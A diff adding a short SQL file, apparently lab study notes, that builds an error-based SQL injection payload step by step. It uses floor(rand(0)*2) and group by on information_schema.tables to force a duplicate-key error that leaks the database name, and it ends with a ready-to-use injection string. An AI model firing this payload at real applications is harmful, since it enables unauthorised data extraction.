@@ -1,0 +1,15 @@
+use security;
+select database();
+select concat((select database()));
+select concat((select database()),floor(rand(0)*2));
+select concat("~",(select database()),"~",floor(rand(0)*2));
+select concat("~",(select database()),"~",floor(rand(0)*2)) from information_schema.tables;
+select (concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables;
+
+select (concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables;
+
+select count(*), (concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables group by c;
+
+select 1 from (select count(*), (concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables group by c)a;
+
+" AND (select 1 from (select count(*), (concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables group by c)a) #
